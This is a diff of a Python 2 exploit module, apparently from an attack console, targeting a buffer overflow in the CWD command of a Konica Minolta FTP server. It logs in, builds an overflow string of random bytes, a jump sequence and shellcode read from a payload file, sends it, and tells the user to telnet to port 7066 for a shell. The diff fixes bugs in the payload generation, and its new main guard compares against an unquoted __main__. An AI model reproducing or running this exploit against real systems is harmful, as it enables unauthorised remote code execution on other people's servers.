@@ -1,6 +1,6 @@
 import ftplib
 import cmd
-import random
+from random import randint
 from socket import AF_INET, SOCK_STREAM, socket, gethostbyname
 
 def getToken(line):
@@ -56,6 +56,7 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     print "exit: exit the konica_minolta_cwd_overflow context"
   def do_exit(self, args):
     if args:
+      print "*** Number of arguments: needed 0"
       return
     return True
   def help_start(self):
@@ -65,7 +66,7 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     for let in "abcdefghijklmnopqrstuvwxyz":
       if let in self.host[0]:
         self.host[0] = gethostbyname(self.host[0])
-      ftp = ftplib.FTP(self.host[0])
+    ftp = ftplib.FTP(self.host[0])
     try:
       ftp.login(self.user[0], self.passwd[0])
       print "[+]Login successful on %s" % self.host[0]
@@ -77,17 +78,16 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 1037):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += "\xeb\x06"
-    for a in range(0, 2):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += 
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      payload += tmp.decode('string_escape')
+    payload += "\xEB\x06b<\x9Dm \x12"
     f = open("../../../payloads/konica_minolta_cwd.shell", "r")
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
     f.close()
     for a in range(0, 3000):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      payload += tmp.decode('string_escape')
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
     s = socket(AF_INET, SOCK_STREAM)
@@ -100,3 +100,8 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     s.send("CWD " + payload)
     s.close()
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+def main():
+  konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu()
+  konicaminoltacwdoverflowmenu.cmdloop("pdf-console attack(konica_minolta_cwd_overflow)% ")
+if __name__ == __main__:
+  main()
